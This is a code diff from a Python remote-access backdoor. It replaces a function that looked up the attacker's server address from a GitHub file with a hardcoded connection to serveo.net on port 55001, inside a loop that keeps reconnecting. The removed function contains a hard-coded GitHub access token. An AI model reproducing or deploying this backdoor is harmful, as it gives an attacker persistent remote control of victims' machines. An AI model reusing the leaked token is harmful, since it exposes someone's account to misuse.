@@ -1,6 +1,5 @@
 import requests
 import subprocess
-import threading
 import socket
 import os
 import time
@@ -160,36 +159,6 @@ class backdoor:
                 break
 
 
-def GetIp():
-    GITHUB_TOKEN = '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'
-    REPO_OWNER = 'Jevelin4k'
-    REPO_NAME = 'ip'
-    FILE_PATH = 'README.md'
-    BRANCH = 'main'  # or the branch where the file is located
-
-    # GitHub API URL to fetch the file
-    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}?ref={BRANCH}'
-
-    # Headers for authentication
-    headers = {
-        'Authorization': f'token {GITHUB_TOKEN}',
-        'Accept': 'application/vnd.github.v3.raw'  # Get raw file content
-    }
-
-    # Make the request to the GitHub API
-    response = requests.get(url, headers=headers)
-
-    # Check if the request was successful
-    if response.status_code == 200:
-        file_content = response.text
-        print(file_content)
-        return file_content
-
-    else:
-        print(f'Failed to fetch file: {response.status_code}')
-        print(response.json())
-        return response.json()
-
 
 if __name__ == "__main__":
     try:
@@ -199,7 +168,7 @@ if __name__ == "__main__":
             pass
 
         while True:
-            REMOTE_HOST = GetIp()
+            REMOTE_HOST = 'serveo.net'
             REMOTE_PORT = 55001
 
             backdoor(REMOTE_HOST, REMOTE_PORT)
